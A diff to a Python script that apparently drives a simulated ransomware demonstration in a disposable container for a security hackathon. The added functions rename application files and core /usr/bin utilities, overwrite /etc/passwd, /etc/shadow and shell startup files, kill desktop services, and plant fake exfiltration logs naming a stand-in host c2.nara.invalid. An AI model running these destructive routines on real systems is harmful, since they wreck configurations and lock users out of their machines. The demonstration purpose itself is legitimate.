@@ -13,6 +13,8 @@ This is a VISUAL DEMONSTRATION for a security research hackathon.
 - Container is disposable and resettable via 'nara > reset'
 """
 
+import datetime
+import glob
 import os
 import shlex
 import subprocess
@@ -1079,6 +1081,204 @@ feh --bg-fill {wp} 2>/dev/null || true
         print(f"[RANSOMWARE] Wallpaper change failed: {e}")
 
 
+# ------------------------------------------------------------------ #
+# “Container unusable” finale (FEAT.md) — encrypt_system_binaries LAST #
+# ------------------------------------------------------------------ #
+
+_APPLICATION_ROOT = "/opt/pokedex"
+_EXFIL_DIR = "/tmp/nara_exfil"
+_APP_ENCRYPT_SUFFIXES = (".py", ".html", ".db", ".json", ".cfg")
+_CORRUPT_MARK = "NARA-COMPROMISED\n"
+
+
+def encrypt_application_files() -> None:
+    """Rename vulnerable app sources under /opt/pokedex to *.NARA_ENCRYPTED (skip .git/)."""
+    if not os.path.isdir(_APPLICATION_ROOT):
+        print(f"[RANSOMWARE] encrypt_application_files: skip (no {_APPLICATION_ROOT})")
+        return
+    count = 0
+    for dirpath, dirnames, filenames in os.walk(_APPLICATION_ROOT):
+        if ".git" in dirnames:
+            dirnames.remove(".git")
+        for fn in filenames:
+            if fn.endswith(".NARA_ENCRYPTED"):
+                continue
+            if not any(fn.endswith(sfx) for sfx in _APP_ENCRYPT_SUFFIXES):
+                continue
+            path = os.path.join(dirpath, fn)
+            if not os.path.isfile(path):
+                continue
+            dst = path + ".NARA_ENCRYPTED"
+            try:
+                os.rename(path, dst)
+                count += 1
+            except OSError as e:
+                print(f"[RANSOMWARE] encrypt_application_files skip {path}: {e}")
+    print(f"[RANSOMWARE] encrypt_application_files: {count} file(s)")
+
+
+def seed_exfiltration_evidence() -> None:
+    """Plant fake exfil logs + desktop marker (pure file writes)."""
+    os.makedirs(_EXFIL_DIR, exist_ok=True)
+    ts = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
+    manifest = "\n".join(
+        [
+            f"{ts} UPLOAD financial_report_Q4.xlsx -> c2.nara.invalid",
+            f"{ts} UPLOAD employee_records.csv -> c2.nara.invalid",
+            f"{ts} UPLOAD database_backup.sql -> c2.nara.invalid",
+            f"{ts} UPLOAD api_keys.txt -> c2.nara.invalid",
+            f"{ts} SESSION exfil_complete=true",
+        ]
+    )
+    try:
+        with open(os.path.join(_EXFIL_DIR, "exfil_manifest.log"), "w") as f:
+            f.write(manifest + "\n")
+        with open(os.path.join(_EXFIL_DIR, "stolen_credentials.txt"), "w") as f:
+            f.write(
+                "root:xK9mP2qL\n"
+                "admin:SuperSecret2026!\n"
+                "db_svc:AKIAIOSFODNN7EXAMPLE\n"
+            )
+    except OSError as e:
+        print(f"[RANSOMWARE] seed_exfiltration_evidence: {e}")
+
+    desktop = _desktop_path()
+    try:
+        os.makedirs(desktop, exist_ok=True)
+        marker = os.path.join(desktop, "DATA_EXFILTRATED.txt")
+        with open(marker, "w") as f:
+            f.write(
+                "CONFIRMED: Data staged for exfiltration.\n"
+                "See /tmp/nara_exfil/ — NARA simulation.\n"
+            )
+        print(f"[RANSOMWARE] seed_exfiltration_evidence → {marker}")
+    except OSError as e:
+        print(f"[RANSOMWARE] DATA_EXFILTRATED marker: {e}")
+
+
+def corrupt_system_configs() -> None:
+    """Overwrite key system text files + XFCE xfconf XML (demo container only)."""
+    for p in (
+        "/etc/passwd",
+        "/etc/shadow",
+        "/etc/hostname",
+        "/etc/motd",
+        "/root/.profile",
+    ):
+        try:
+            with open(p, "w") as f:
+                f.write(_CORRUPT_MARK)
+        except OSError as e:
+            print(f"[RANSOMWARE] corrupt_system_configs skip {p}: {e}")
+
+    xfdir = "/root/.config/xfce4/xfconf/xfce-perchannel-xml"
+    if os.path.isdir(xfdir):
+        for xmlp in glob.glob(os.path.join(xfdir, "*.xml")):
+            try:
+                with open(xmlp, "w") as f:
+                    f.write("<!-- NARA-COMPROMISED -->\n")
+            except OSError:
+                pass
+    print("[RANSOMWARE] corrupt_system_configs: done")
+
+
+def disable_terminal_access() -> None:
+    """New shells print ransom banner in red and exit 1 (existing terminals keep running)."""
+    block = """# NARA — terminal access disabled (simulation)
+printf '\\033[1;31m'
+cat << 'NARA_TERM'
+NARA: THIS SYSTEM HAS BEEN COMPROMISED — ACCESS DENIED
+NARA_TERM
+printf '\\033[0m\\n'
+exit 1
+"""
+    for p in ("/root/.bashrc", "/root/.zshrc"):
+        try:
+            with open(p, "w") as f:
+                f.write(block)
+        except OSError as e:
+            print(f"[RANSOMWARE] disable_terminal_access skip {p}: {e}")
+    try:
+        with open("/etc/bash.bashrc", "w") as f:
+            f.write(block)
+    except OSError as e:
+        print(f"[RANSOMWARE] disable_terminal_access /etc/bash.bashrc: {e}")
+    print("[RANSOMWARE] disable_terminal_access: new shells will exit immediately")
+
+
+def kill_all_services() -> None:
+    """
+    Tear down XFCE UI (popups become hard to dismiss — run only after zenity wave).
+    Preserves VNC, python, dbus, tail, noVNC stack.
+    """
+    names = (
+        "xfce4-panel",
+        "xfce4-session",
+        "thunar",
+        "xfdesktop",
+        "xfce4-power-manager",
+        "xfce4-notifyd",
+        "xfsettingsd",
+        "xfwm4",
+    )
+    script = "".join(f"pkill -x {n} 2>/dev/null; " for n in names) + "true"
+    try:
+        subprocess.run(
+            ["bash", "-c", script],
+            timeout=30,
+            capture_output=True,
+        )
+        print("[RANSOMWARE] kill_all_services: XFCE components signaled")
+    except (OSError, subprocess.TimeoutExpired) as e:
+        print(f"[RANSOMWARE] kill_all_services: {e}")
+
+
+def encrypt_system_binaries() -> None:
+    """
+    LAST STEP: rename common /usr/bin utilities — after this, no subprocess/shell.
+    Never touch python3, or tools required by the running session per FEAT.md.
+    """
+    bindir = "/usr/bin"
+    targets = (
+        "bash",
+        "sh",
+        "dash",
+        "ls",
+        "cat",
+        "grep",
+        "find",
+        "cp",
+        "mv",
+        "rm",
+        "nano",
+        "vi",
+        "apt",
+        "apt-get",
+        "dpkg",
+        "wget",
+        "curl",
+        "ssh",
+        "sudo",
+        "passwd",
+        "chmod",
+        "chown",
+    )
+    n = 0
+    for name in targets:
+        src = os.path.join(bindir, name)
+        if not os.path.isfile(src) or os.path.islink(src):
+            continue
+        dst = src + ".NARA_ENCRYPTED"
+        if os.path.lexists(dst):
+            continue
+        try:
+            os.rename(src, dst)
+            n += 1
+        except OSError:
+            pass
+    print(f"[RANSOMWARE] encrypt_system_binaries: {n} binary name(s) renamed (LAST)")
+
+
 def print_ascii_skull():
     """Print an ASCII skull for dramatic terminal effect."""
     skull = r"""
@@ -1107,21 +1307,18 @@ def main(custom_message: str = ""):
     shutdown_vulnerable_webapp()
     drop_ransom_note(custom_message)
     generate_rocket_icons()
-    # Install R icon theme FIRST so xfdesktop's next scan uses R for everything.
-    # This handles both MIME-type file icons AND xfdesktop built-in shortcuts
-    # (Home, Filesystem) which are controlled by the active GTK icon theme.
     install_r_icon_theme()
-    # Register MIME type + install icon system-wide so .NARA_ENCRYPTED files
-    # resolve to 'application-x-nara-encrypted' and get the R icon.
     register_nara_encrypted_mime()
-    # All victim files exist before we touch .desktop launchers or encrypt.
     seed_dummy_sensitive_files()
     hijack_desktop_shortcuts()
     encrypted_paths = encrypt_loose_files_everywhere()
+
+    encrypt_application_files()
+    seed_exfiltration_evidence()
+
     change_wallpaper()
     kill_firefox()
-    show_ransom_popups(10)
-    # Icons last: /root/Desktop and user Desktop — all entries + encrypted files elsewhere
+    show_ransom_popups(25)
     apply_r_icons_final(encrypted_paths)
     refresh_desktop_icons()
 
